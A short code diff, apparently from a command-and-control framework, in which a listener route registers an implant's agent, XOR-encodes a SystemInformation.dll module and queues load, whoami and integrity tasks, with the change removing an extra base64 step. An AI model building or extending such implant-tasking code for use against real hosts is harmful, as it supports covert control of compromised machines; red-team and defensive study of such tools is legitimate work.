@@ -46,10 +46,9 @@ class ListenerRoutes:
         agent = AgentModel(implant=implant)
         module_bytes = open(f'{os.getcwd()}/resources/modules/SystemInformation.dll', 'rb').read()
         module_md5 = hashlib.md5(module_bytes).hexdigest()
-        agent.loaded_modules = module_md5 if not agent.loaded_modules else ','.join(
-            agent.loaded_modules) + f',{module_md5}'
+        agent.loaded_modules = module_md5 if not agent.loaded_modules else ','.join(agent.loaded_modules) + f',{module_md5}'
         module, key = xor_base64(module_bytes)
-        parameters = ','.join([string_to_base64(module), string_to_base64(key)])
+        parameters = ','.join([module, key])
         load_task = TaskModel(agent=agent, method='load', type=-1, parameters=parameters, misc='')
         whoami_task = TaskModel(agent=agent, method='whoami', type=-1, parameters='', misc='')
         integrity_task = TaskModel(agent=agent, method='integrity', type=-1, parameters='', misc='')
